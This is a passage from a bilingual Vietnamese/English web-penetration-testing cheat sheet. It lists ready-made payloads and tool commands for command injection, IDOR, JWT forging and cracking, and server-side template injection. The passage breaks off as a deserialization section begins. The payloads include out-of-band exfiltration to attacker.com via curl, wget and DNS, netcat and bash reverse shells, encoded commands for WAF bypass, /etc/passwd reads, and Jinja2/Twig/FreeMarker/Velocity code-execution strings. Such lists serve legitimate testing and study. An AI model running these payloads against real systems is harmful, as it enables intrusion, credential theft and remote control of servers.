&& id                                                # Runs id if the first command succeeds (Linux/Windows)
| id                                                 # Pipes input to id (Linux/Windows)
|| id                                                # Runs id if the first command fails (Linux/Windows)
%0aid                                                # Hex encoded newline separator execution (Linux)
`id`                                                 # Inlined backtick command evaluation (Linux)
$(id)                                                # Inline subshell command execution (Linux)
& whoami                                             # CMD command concatenation (Windows)
; cat$IFS/etc/passwd                                    #  CMDi utilizing IFS space substitute to bypass space filters and WAF rules.
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng Commix để quét tự động phát hiện và khai thác Active Command Injection.
    *   *English*: Use Commix tool to automatically scan, identify, and exploit active command injection points.
    ```bash
    commix --url="http://target.com/cmd.php?addr=127.0.0.1" --batch
    ```


---

### 6.2. Blind Time-based Command Injection
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Ứng dụng thực thi lệnh hệ điều hành nhưng kết quả stdout không hiển thị lên màn hình hoặc phản hồi HTTP.
    *   *English*: Command is executed but output is hidden. Detection must be performed via processing time delays.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Chèn lệnh gây trễ hệ thống như `sleep 5` hoặc `timeout 5` và kiểm tra xem thời gian phản hồi của máy chủ có tăng lên không.
    *   *English*: Inject time delay commands (`sleep 5`) and measure server latency.
*   **Payloads (10 Payloads)**:
```
; sleep 5                                            # Suspends execution for 5 seconds (Linux)
&& sleep 5                                           # Delay if preceding command succeeds (Linux)
|| sleep 5                                           # Delay if preceding command fails (Linux)
$(sleep 5)                                           # Inline time-based delay (Linux)
& sleep 5 &                                          # Background delay call (Linux)
& timeout 5                                          # Suspends execution using Windows timeout (Windows)
& ping -n 6 127.0.0.1                                # Windows fallback delay using ping loop (Windows)
; Start-Sleep -s 5                                   # PowerShell sleep delay (Windows)
; find / -name "flag*"                               # Time-based delay using CPU-intensive search (Linux)
;sleep$IFS''5                                        #  Time delay utilizing space substitute to bypass space filters and WAF rules.
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Cấu hình Commix chạy ở chế độ Blind Time-based.
    *   *English*: Run Commix in blind time-based detection mode to exploit hidden targets.
    ```bash
    commix --url="http://target.com/cmd.php?addr=127.0.0.1" --technique=T --batch
    ```


---

### 6.3. Blind Out-of-Band (OOB) Command Injection
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Ứng dụng thực thi lệnh ngầm và máy chủ mục tiêu có kết nối mạng ra bên ngoài (egress connections).
    *   *English*: Command is executed silently, and the target server permits outgoing network connections.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Chèn lệnh gọi về máy chủ DNS/HTTP OOB (như `nslookup`, `curl`) để kiểm tra xem có kết nối mạng gọi ngược về không.
    *   *English*: Inject command callbacks (`curl`, `nslookup`) pointing to your OOB listener domain.
*   **Payloads (10 Payloads)**:
```
; curl http://attacker.com/$(whoami)                 # Sends username output to remote web server
; wget http://attacker.com/$(whoami)                 # OOB exfiltration using wget
; nslookup $(whoami).attacker.com                    # Exfiltrates username via DNS query subdomain
; dig $(whoami).attacker.com                         # Alternative DNS queries using dig
; ping -c 4 attacker.com                             # Ping callback test
; nc attacker.com 4444 -e /bin/sh                    # Outgoing reverse shell using netcat
; bash -i >& /dev/tcp/attacker.com/4444 0>&1         # Outgoing pure bash TCP connection
; (New-Object System.Net.WebClient).DownloadString('http://attacker.com/' + (whoami)) # PowerShell web client OOB
& certutil -urlcache -f http://attacker.com/logo.gif # Certutil remote download request (Windows)
;curl$IFS'attacker.com/$(whoami)'      #  OOB callback utilizing space substitute to bypass space filters and WAF rules.
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng Commix cấu hình `--oob-server` để bắt các callback tự động.
    *   *English*: Use Commix with `--oob-server` parameter to capture automatic reverse connection signals.
    ```bash
    commix --url="http://target.com/cmd.php?addr=127.0.0.1" --dns-domain="your-interactsh-domain.com"
    ```


---

### 6.4. Filter Bypass & WAF Bypass (WAF Bypass Payload included)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Các ký tự nối lệnh cơ bản (như dấu cách, dấu chấm phẩy) hoặc các từ khóa bị tường lửa chặn và báo lỗi 403.
    *   *English*: Traversal elements (spaces, semicolons) or command signatures are blocked by filtering rules.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thử sử dụng biến môi trường `$IFS`, dấu ngoặc nhọn `{}` hoặc mã hóa Base64 để vượt qua bộ lọc.
    *   *English*: Test path separators alternative structures, brace expansion, or Base64 decoding string pipelines.
*   **Payloads (10 Payloads)**:
```
;cat$IFS/etc/passwd                                  # Bypasses space check using Internal Field Separator
;{cat,/etc/passwd}                                   # Bypasses space check using bash brace expansion
;c'a't /et'c'/pas's'wd                               # Bypasses keyword filters using quote separation
;a=ca;b=t;c=/etc/passwd;$a$b $c                      # Bypasses signatures via variable assignment
;echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash # Hex encoded script pipe
;echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | sh        # Base64 encoded payload pipe (evades ASCII filters)
& powershell -EncodedCommand YwBhAHQAIAAvAGUAdABjAC8AcABhAHMAcwB3AGQA # PowerShell base64 encoded payload execution (requires UTF-16LE base64 encoding of command)
;cat /et?/pas??d                                     # Bypasses exact file match filters using wildcards
;${PATH:0:1}bin${PATH:0:1}cat /etc/passwd            # Slices PATH variable to extract slashes (/) dynamically
;$(echo{cat,/etc/passwd})                            # Combined brace, redirection, and subshell bypass (WAF Bypass)
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng Commix kết hợp với các tamper script để tự động hóa việc vượt bộ lọc của WAF.
    *   *English*: Configure Commix with custom tamper scripts to bypass signature checking.
    ```bash
    commix --url="http://target.com/cmd.php?addr=127.0.0.1" --tamper="base64encode" --batch
    ```

---

## 7. IDOR / Broken Access Control

IDOR (Insecure Direct Object Reference) là lỗ hổng phân quyền xảy ra khi ứng dụng cung cấp quyền truy cập trực tiếp vào các đối tượng thông qua tham số do người dùng kiểm soát mà không xác thực quyền sở hữu.

### 7.1. Horizontal Privilege Escalation / IDOR
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: URL hoặc POST data chứa trực tiếp các ID tài khoản hoặc ID tài nguyên dạng số tăng dần dễ đoán.
    *   *English*: Request parameters or routes display direct object IDs (predictable sequential integers or UUIDs).
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Đăng nhập hai tài khoản cùng cấp độ quyền. Dùng token tài khoản A để gửi yêu cầu truy xuất ID của tài khoản B.
    *   *English*: Test using two accounts of equivalent privilege levels; attempt to access/modify resources of the second user.
*   **Payloads (10 Payloads)**:
```
GET /api/v1/profile?id=1002                          # Attempts to access user 1002 profile (Original: 1001)
GET /api/v1/profile?id=0                             # ID 0 injection to check default/system accounts
GET /api/v1/profile?id=-1                            # Negative integer bound check
GET /api/v1/profile?id[]=1001&id[]=1002              # Array parameter injection to bypass database query limits
GET /api/v1/profile?id=1001&id=1002                  # HTTP Parameter Pollution (HPP) query manipulation
POST /api/v1/billing {"invoice_id":2045,"user_id":50}# Body parameter manipulation to change invoice owner
<request><order_id>2045</order_id><user_id>50</user_id></request> # XML parameter tampering in SOAP/XML API
GET /api/v1/profile (Header: X-User-ID: 1)           # Identity Header spoofing (Admin ID guess)
PUT /api/v1/profile {"email":"attacker@evil.com"}   # Accesses update router without validating ownership
GET /api/v1/profile?id=6c84ade0-1041-11e9-8b2f-97e0049d5c41 # Guessing UUIDv1 timestamp component (valid 36-character UUIDv1 format)
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng Burp Suite Intruder để quét thay thế tự động các ID số tăng dần hoặc sử dụng tiện ích Autorize.
    *   *English*: Use Burp Suite Intruder to iterate over sequential parameter IDs or deploy Autorize.
    ```bash
    # Fuzz sequential integer ID parameters to discover IDOR vulnerabilities using ffuf
    ffuf -u "http://target.com/api/v1/profile?id=FUZZ" -w ids_list.txt -fs <normal_response_size>
    # Fuzz UUID parameters using a custom wordlist to discover horizontal escalation
    ffuf -u "http://target.com/api/v1/profile?id=FUZZ" -w uuids_list.txt -fs <normal_response_size>
    ```


---

### 7.2. Vertical Privilege Escalation / Broken Access Control
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Xuất hiện các URL quản trị lộ thiên hoặc các tham số chỉ định vai trò như `role=User` hoặc `is_admin=false`.
    *   *English*: Administrative endpoints are exposed, or parameters explicitly indicate roles (e.g. `role`, `is_admin`).

    ```bash
    # Use curl to check access to administrative endpoint using a low-privilege token
    curl -H "Authorization: Bearer <low_privilege_token>" http://target.com/api/admin/users
    ```
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Sử dụng tài khoản thường để gửi yêu cầu đến các API/URL của Admin và xem hệ thống có từ chối truy cập không.
    *   *English*: Issue requests to administrator endpoints using standard user sessions.
*   **Payloads (10 Payloads)**:
```
GET /admin/dashboard                                 # Direct URL access to admin endpoint
GET /api/admin/users (Bearer regular_user_token)     # Accesses administrative APIs with low privilege session
POST /api/v1/users {"username":"test","is_admin":true} # Mass Assignment parameter injection to escalate role
POST /api/v1/users {"username":"test","role":"Admin"}# Directly modifies privilege parameters in JSON body
GET /api/v1/admin/settings                           # Testing unauthenticated administrative paths
PUT /api/v1/settings {"registration_enabled":true}   # Modifies global settings route without proper verification
GET /api/v1/users/me (Header: X-Original-URL: /api/v1/admin/users) # URL rewrite bypass
GET /admin (Header: X-Custom-IP-Authorization: 127.0.0.1) # Bypasses IP access restriction via local address header
GET /admin (Header: X-Forwarded-For: 127.0.0.1)      # Local IP forwarding spoofing
POST /api/v1/user/upgrade {"user_id":1001}           # Unverified user role elevation endpoint
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Cấu hình tiện ích mở rộng Autorize trên Burp Suite để tự động lặp lại các request với quyền Admin.
    *   *English*: Set up Autorize extension in Burp Suite to automatically test low-privilege sessions against administrative endpoints.

---

## 8. JWT Attacks

JWT Attacks xảy ra khi ứng dụng cấu hình hoặc xác thực JSON Web Token (JWT) không an toàn, cho phép kẻ tấn công chỉnh sửa nội dung token, giả mạo chữ ký hoặc thay đổi phân quyền.

### 8.1. Alg None Attacks
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Token JWT được sử dụng để xác thực người dùng qua Cookie hoặc Authorization header.
    *   *English*: JWT token format is present inside HTTP requests, containing metadata parameters in header block.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Giải mã token, thay đổi giá trị thuộc tính `"alg"` thành `"none"` (hoặc biến thể), xóa chữ ký và gửi lại.
    *   *English*: Decode token, change signature algorithm header value to `none`, strip signature block and verify.
*   **Payloads (10 Payloads)**:
```
Header: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=        # {"alg":"none","typ":"JWT"}
Header: eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0=        # {"alg":"NONE","typ":"JWT"}
Header: eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0=        # {"alg":"nOnE","typ":"JWT"}
Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.ey...    # Unsigned token with alg:none (needs trailing dot)
Token: eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.ey...    # Unsigned token with alg:NONE (needs trailing dot)
Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.ey...    # Trailing dot omitted filter bypass test
Header: eyJhbGciOiJub25lIiwiZXh0cmEiOiJ0ZXN0In0=    # Obfuscated parameter header test
Token: eyJhbGciOiJub25lIn0.ey...                     # Minimally structured none algorithm header
Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.ey...    # Encoded none algorithm token bypass
Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0. # Long expiry none admin token
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng công cụ jwt_tool để tự động quét lỗi thuật toán "none" trên token.
    *   *English*: Use jwt_tool to automate none algorithm checking and signature bypass tests.
    ```bash
    python jwt_tool.py <JWT_TOKEN> -X a
    ```


---

### 8.2. Weak Secret Exploitation (HS256)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Token được ký bằng thuật toán đối xứng HS256 và khóa bí mật được đặt đơn giản.
    *   *English*: Token header specifies HS256 algorithm and relies on common passwords as signing secret.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Trích xuất chữ ký và sử dụng danh sách từ khóa phổ biến để bẻ khóa khóa bí mật HS256 ngoại tuyến.
    *   *English*: Extract JWT token string and perform offline wordlist brute-forcing against HS256 secret.
*   **Payloads (10 Payloads)**:
```bash
    # 1. Save JWT token to file for hashcat cracking (mode 16500 = JWT/JWS)
    echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' > jwt_hash.txt

    # 2. Crack JWT secret using hashcat GPU brute-force (rockyou wordlist)
    hashcat -a 0 -m 16500 jwt_hash.txt rockyou.txt

    # 3. Crack JWT secret using hashcat with common passwords wordlist
    hashcat -a 0 -m 16500 jwt_hash.txt /usr/share/wordlists/fasttrack.txt

    # 4. Crack JWT secret using hashcat with mask (brute-force short secrets)
    hashcat -a 3 -m 16500 jwt_hash.txt '?a?a?a?a?a?a'

    # 5. jwt_tool offline dictionary attack (scans all common weak secrets)
    python jwt_tool.py <JWT_TOKEN> -C -d rockyou.txt

    # 6. jwt_tool crack with a known common weak secrets list
    python jwt_tool.py <JWT_TOKEN> -C -d /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt

    # 7. Forge/re-sign JWT with cracked secret, escalate role to admin
    python jwt_tool.py <JWT_TOKEN> -S hs256 -k <CRACKED_SECRET> -I -pc sub -pv admin

    # 8. Forge JWT with cracked secret, set is_admin=true
    python jwt_tool.py <JWT_TOKEN> -S hs256 -k <CRACKED_SECRET> -I -pc is_admin -pv true

    # 9. Python PyJWT script to verify a guessed secret offline
    python -c "import jwt; print(jwt.decode('<JWT_TOKEN>', 'secret', algorithms=['HS256']))"

    # 10. Python loop to brute-force common weak HS256 secrets manually
    python -c "
import jwt, sys
weakkeys = ['secret','admin','password','123456','jwt','key','development','test','system','letmein']
for k in weakkeys:
    try:
        payload = jwt.decode('<JWT_TOKEN>', k, algorithms=['HS256'])
        print('Cracked! Secret:', k, 'Payload:', payload); break
    except: pass
"
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng hashcat để bẻ khóa chữ ký JWT cực nhanh bằng GPU.
    *   *English*: Run hashcat to brute force weak HS256 keys from JWT files.
    ```bash
    hashcat -a 0 -m 16500 jwt_hash.txt rockyou.txt
    ```


---

### 8.3. kid Injection
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Phần header của JWT chứa tham số `"kid"` (Key ID) dùng để chỉ định khóa giải mã trong cơ sở dữ liệu hoặc hệ thống tệp.
    *   *English*: JWT token header contains `kid` parameter pointing to public keys or databases.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Chèn các ký tự Path Traversal (để tải tệp rỗng `/dev/null`) hoặc SQL Injection vào thuộc tính `"kid"`.
    *   *English*: Inject directory traversal sequences or SQL clauses into the `kid` property.
*   **Payloads (10 Payloads)**:
```
{"alg":"HS256","kid":"../../../../dev/null"}         # Path traversal to load empty key from /dev/null
{"alg":"HS256","kid":"/dev/null"}                   # Absolute path traversal to load empty key
{"alg":"HS256","kid":"1' UNION SELECT 'mykey'-- -"} # SQLi in kid parameter. The SQL engine returns a row containing the attacker's chosen symmetric key 'mykey', forcing the application to use it for signature validation.
{"alg":"HS256","kid":"' UNION SELECT CHAR(109,121,107,101,121)--"} # SQLi bypass using CHAR representation
{"alg":"HS256","kid":"1' OR 1=1--"}                  # Basic SQLi bypass query
{"alg":"HS256","kid":"../../../../etc/passwd"}       # Attempts to read server files as key content
{"alg":"HS256","kid":"..\\..\\..\\..\\dev\\null"}   # Windows directory traversal for null key load
{"alg":"HS256","kid":"c:\\boot.ini"}                 # Windows boot configuration file traversal
{"alg":"HS256","kid":"%2e%2e%2f%2e%2e%2fdev%2fnull"} # URL encoded traversal path injection
{"alg":"HS256","kid":"../../../../etc/passwd%00"}   # ⚠️ Null byte truncation path traversal (Version Warning: Null byte truncation (%00) is effective only in legacy runtimes like PHP < 5.3.4, Java < 7)
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng jwt_tool với cờ inject header để chèn payload vào tham số kid.
    *   *English*: Run jwt_tool using custom header parameters to inject exploit signatures inside the kid parameter.
    ```bash
    python jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "../../../../dev/null"
    ```


---

### 8.4. JWK / JKU Injection (JWKS Spoofing)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Header của token chứa thuộc tính `"jwk"` hoặc `"jku"` (JSON Web Key Set URL).
    *   *English*: Token header specifies `jwk` (JSON Web Key) or `jku` (JSON Web Key set URL) properties.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thay đổi `"jku"` trỏ về máy chủ do bạn kiểm soát chứa khóa công khai tự tạo của bạn và ký lại token. Kẻ tấn công ký token bằng khóa tư (private key) và máy chủ nạn nhân xác thực bằng khóa công khai tải về từ URL JKU.
    *   *English*: Modify `jku` to point to an attacker-controlled domain hosting a custom JWKS keys file (e.g. `keys.json`). The attacker signs the forged token with their private key, and the server verifies it using the public key fetched from the JKU endpoint.
        Minimal valid JWKS JSON schema (`keys.json`) to host:
        ```json
        {
          "keys": [
            {
              "kty": "RSA",
              "use": "sig",
              "kid": "key1",
              "alg": "RS256",
              "n": "modulus-value-here",
              "e": "AQAB"
            }
          ]
        }
        ```
*   **Payloads (10 Payloads)**:
```
{"alg":"RS256","jwk":{"kty":"RSA","e":"AQAB","n":"attacker-modulus..."}} # Attacker public key inline injection
{"alg":"RS256","jku":"http://attacker.com/keys.json","kid":"key1"} # Attacker JKU URL endpoint injection
{"alg":"RS256","jku":"https://trusted-domain.com.attacker.com/keys.json"} # Open redirect domain bypass test
{"alg":"RS256","jku":"http://127.0.0.1/keys.json"}   # SSRF key retrieval test on local address
{"alg":"RS256","jku":"http://localhost:8080/keys.json"} # SSRF alternative localhost port test
{"alg":"RS256","jku":"https://trusted.com/oauth/../keys.json"} # Path traversal in JKU URL parameter
{"alg":"RS256","jku":"http://attacker.com%2f@trusted.com/keys.json"} # Host spoofing bypass test
{"alg":"RS256","jku":"http://attacker.com:80#@trusted.com/keys.json"} # Fragment host spoofing bypass
{"alg":"RS256","jku":"http://attacker.com/jku.json?trusted.com"} # Query parameter spoofing bypass
{"alg":"RS256","jku":"http://trusted.com@attacker.com/keys.json"} # Basic authentication host spoofing
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng jwt_tool để cấu hình khóa giả mạo và tự động ký lại JWT.
    *   *English*: Use jwt_tool with custom keys to automate JWK injection.
    ```bash
    python jwt_tool.py <JWT_TOKEN> -j -k attacker_key.pem
    ```

---

## 9. SSTI (Server-Side Template Injection)

SSTI (Server-Side Template Injection) xảy ra khi ứng dụng đưa trực tiếp đầu vào của người dùng vào các công cụ render giao diện (Template Engines) mà không mã hóa, dẫn đến thực thi mã trên máy chủ.

### 9.1. Detection & Identification Polyglots
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Ứng dụng sử dụng template engine để kết xuất trang web động và phản chiếu dữ liệu nhập vào.
    *   *English*: Application parses templates to render pages dynamically, echoing parameters back to screen.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Gửi các biểu thức toán học dạng `${7*7}`, `{{7*7}}` và kiểm tra xem kết quả có trả về `49` hay không.
    *   *English*: Submit mathematical expressions `${7*7}` or `{{7*7}}` and analyze outputs.
*   **Payloads (10 Payloads)**:
```html
    <!-- 1. Generic tag execution test to trigger syntax errors in almost all modern template engines -->
    ${{<%[%'"}}%\\.

    <!-- 2. Jinja2 / Twig / Pebble detection test (returns 49) -->
    {{7*7}}

    <!-- 3. FreeMarker / Velocity / SpringEL detection test (returns 49) -->
    ${7*7}

    <!-- 4. Ruby ERB detection test (returns 49) -->
    <%= 7*7 %>

    <!-- 5. Pebble / Thymeleaf detection test (returns 49) -->
    #{7*7}

    <!-- 6. Jinja2 specific repetition test (returns '7777777' in Jinja2, but '49' in Twig) -->
    {{7*'7'}}

    <!-- 7. Thymeleaf alternative expression evaluation -->
    *{7*7}

    <!-- 8. DotLiquid template engine mathematical evaluation -->
    @[7*7]

    <!-- 9. ASP.NET Razor engine syntax evaluation -->
    @(7*7)

    <!-- 10. AngularJS / VueJS client-side template injection probe -->
    ${{7*7}}
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng tplmap để quét tự động phát hiện loại engine template đang sử dụng.
    *   *English*: Use tplmap to scan target pages and identify the type of active template engine.
    ```bash
    python tplmap.py -u "http://target.com/?name=test"
    ```


---

### 9.2. Jinja2 (Python)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Ứng dụng được viết bằng Python (Flask/Django) và phản hồi kết quả biểu thức Jinja2.
    *   *English*: Server runs Python code base (Flask/Django) and handles template statements.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Gửi các biểu thức đặc trưng của Jinja2 như `{{self}}` hoặc `{{config}}` để xem thông tin cấu hình.
    *   *English*: Submit python-specific template blocks to verify class hierarchies.
*   **Payloads (10 Payloads)**:
```python
    # 1. Accesses the Flask/Jinja2 application configuration object
    {{config}}

    # 2. Dumps all active environment variables, secret keys, and database credentials
    {{config.items()}}

    # 3. Lists all python subclasses loaded in the environment to find execution vectors (⚠️ Warning: Subclass indexes are highly environment and Python version dependent)
    {{self.__class__.__mro__[1].__subclasses__()}}

    # 4. Executes system command 'id' using subprocess.Popen (index 408 is environment-dependent; will cause IndexError if mismatched)
    {{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()}}

    # 5. RCE using the request object to dynamically import the python 'os' module
    {{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}

    # 6. RCE using Flask config class initialization globals
    {{config.__class__.__init__.__globals__['os'].popen('id').read()}}

    # 7. Bypass filter using string concatenation for blocked keywords (e.g. 'os')
    {{self['__class__']['__mro__'][1]['__subclasses__']()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}

    # 8. Access builtins dictionary to call open and read system files
    {{request['application']['__globals__']['__builtins__']['open']('/etc/passwd').read()}}

    # 9. Dynamic class search to locate catch_warnings and execute eval dynamically (bypassing static indexes)
    {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{ c.__init__.__globals__['builtins']['eval']('__import__("os").popen("id").read()') }}{% endif %}{% endfor %}

    # 10. RCE via lipsum function globals extraction (cleaner and more reliable Flask/Jinja2 payload)
    {{lipsum.__globals__['os'].popen('id').read()}}
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng tplmap cấu hình engine Jinja2 để thực thi lệnh hoặc lấy shell.
    *   *English*: Run tplmap specifying Jinja2 engine to launch an interactive OS shell.
    ```bash
    python tplmap.py -u "http://target.com/?name=test" --engine Jinja2 --os-shell
    ```


---

### 9.3. Twig (PHP)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Ứng dụng PHP sử dụng công cụ kết xuất Twig (Symfony/Drupal).
    *   *English*: PHP application processes view files utilizing Twig syntax blocks.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Gửi payload Twig cơ bản `{{_self.env}}` để xác thực lỗi.
    *   *English*: Submit Twig verification blocks such as `{{_self.env}}` to test environment context.
*   **Payloads (10 Payloads)**:
```html
    <!-- 1. Accesses environment context (validates Twig engine) -->
    {{_self.env}}

    <!-- 2. Twig RCE using map filter to execute 'id' command (Twig 3.x / newer 2.x) -->
    {{["id"]|map("system")}}

    <!-- 3. Twig RCE using filter function callback for 'whoami' (Twig 3.x / newer 2.x) -->
    {{["whoami"]|filter("system")}}

    <!-- 4. Twig RCE via sort filter invoking shell command execution -->
    {{["cat /etc/passwd"]|sort("system")}}

    <!-- 5. Twig RCE using reduce filter to run command -->
    {{["id"]|reduce("system")}}

    <!-- 6. Twig RCE using registerUndefinedFilterCallback executing system command (Legacy Twig 1.x / older 2.x; blocked in modern Twig) -->
    {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

    <!-- 7. Accesses current template source context details -->
    {{_self.getSourceContext().getPath()}}

    <!-- 8. Alternative Twig variable dump -->
    {{dump()}}

    <!-- 9. Twig command injection using custom payload string mapping -->
    {{"id"|map("passthru")}}

    <!-- 10. Twig dynamic object instantiations check -->
    {{_self.env.getLoader()}}
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng tplmap chỉ định Twig để chạy lệnh OS tùy ý.
    *   *English*: Exploit Twig structures utilizing tplmap commands.
    ```bash
    python tplmap.py -u "http://target.com/?name=test" --engine Twig --os-cmd "id"
    ```


---

### 9.4. FreeMarker (Java)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Ứng dụng Java sử dụng thư viện FreeMarker để sinh mã HTML.
    *   *English*: Java web application loads backend models through FreeMarker template files.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Gửi cấu trúc FreeMarker gọi class Java để khởi chạy tiến trình RCE.
    *   *English*: Submit FreeMarker syntax instantiating Java classes to execute OS commands.
*   **Payloads (10 Payloads)**:
```html
    <!-- 1. FreeMarker RCE using Execute class helper (runs system command) (⚠️ Sandbox Warning: Fails if api_builtin_enabled is false or specific class restrictions are active on the Configuration object) -->
    <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

    <!-- 2. FreeMarker RCE executing 'whoami' -->
    <#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}

    <!-- 3. FreeMarker RCE reading local sensitive files -->
    <#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /etc/passwd")}

    <!-- 4. FreeMarker ObjectConstructor usage to instantiate arbitrary Java classes -->
    <#assign obj="freemarker.template.utility.ObjectConstructor"?new()>${obj("java.lang.ProcessBuilder", "id").start()}

    <!-- 5. FreeMarker template loading from external sources -->
    <#import "/etc/passwd" as custom_file>

    <!-- 6. FreeMarker variable dump to inspect environment config -->
    ${.data_model?keys?join(", ")}

    <!-- 7. FreeMarker alternative execution using process runtime -->
    <#assign rt=objectConstructor("java.lang.Runtime")>${rt.getRuntime().exec("id")}

    <!-- 8. FreeMarker check current version and settings -->
    ${.version}

    <!-- 9. FreeMarker system property extraction -->
    ${.globals}

    <!-- 10. FreeMarker error-based local directory structure leakage -->
    <#include "/nonexistent_directory_error_dump">
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng tplmap quét và khai thác lỗi FreeMarker.
    *   *English*: Run tplmap target parameters pointing to FreeMarker servers.
    ```bash
    python tplmap.py -u "http://target.com/?name=test" --engine FreeMarker --os-cmd "id"
    ```


---

### 9.5. Velocity (Java)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Ứng dụng Java sử dụng công cụ Apache Velocity để xử lý nội dung.
    *   *English*: Apache Velocity syntax templates are active in the target application.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Gửi các biểu thức đặc trưng của Velocity để truy cập đối tượng runtime.
    *   *English*: Submit Velocity object evaluation strings to reference current process runtimes.
*   **Payloads (10 Payloads)**:
```html
    #* 1. Velocity RCE executing 'id' command via ClassTool object (requires ClassTool to be registered in VelocityTools context) *#
    $class.inspect("java.lang.Runtime").type.getRuntime().exec("id")

    #* 2. Velocity RCE executing 'whoami' via OgnlTool (requires OgnlTool to be registered in context) *#
    $ognl.getValue("@java.lang.Runtime@getRuntime().exec('whoami')")

    #* 3. Velocity RCE via process execution mapping *#
    $runtime.getRuntime().exec("id")

    #* 4. Velocity RCE utilizing reflection as general-purpose fallback (only requires any string object) *#
    #set($str="")
    #set($exec=$str.class.forName("java.lang.Runtime").getDeclaredMethod("getRuntime",null).invoke(null,null).exec("id"))

    #* 5. Velocity shell command output reader logic *#
    #set($input=$runtime.getRuntime().exec("whoami").getInputStream())
    #set($reader=$str.class.forName("java.io.BufferedReader").getConstructor($str.class.forName("java.io.InputStreamReader")).newInstance($input))

    #* 6. Velocity variable inspect and dump *#
    $context.keys

    #* 7. Velocity file system reader load *#
    $file.read("/etc/passwd")

    #* 8. Velocity load server information properties *#
    $server.systemProperties

    #* 9. Velocity template loader path resolution *#
    $loader.getResource("/")

    #* 10. Velocity class loader extraction tool *#
    $str.class.classLoader
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Khai thác lỗi Velocity tự động bằng tplmap.
    *   *English*: Automate Velocity exploitation using tplmap.
    ```bash
    python tplmap.py -u "http://target.com/?name=test" --engine Velocity --os-cmd "id"
    ```

---

## 10. Deserialization

Deserialization xảy ra khi ứng dụng chuyển đổi dữ liệu đã được tuần tự hóa (Serialized Data) ngược lại thành đối tượng trong bộ nhớ mà không kiểm duyệt lớp đối tượng, dẫn đến thực thi mã tùy ý (RCE).

### 10.1. Java (ysoserial & Serialization Signatures)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Dữ liệu truyền đi bắt đầu bằng tiền tố Base64 `rO0AB` hoặc chuỗi byte hex `ac ed 00 05`.
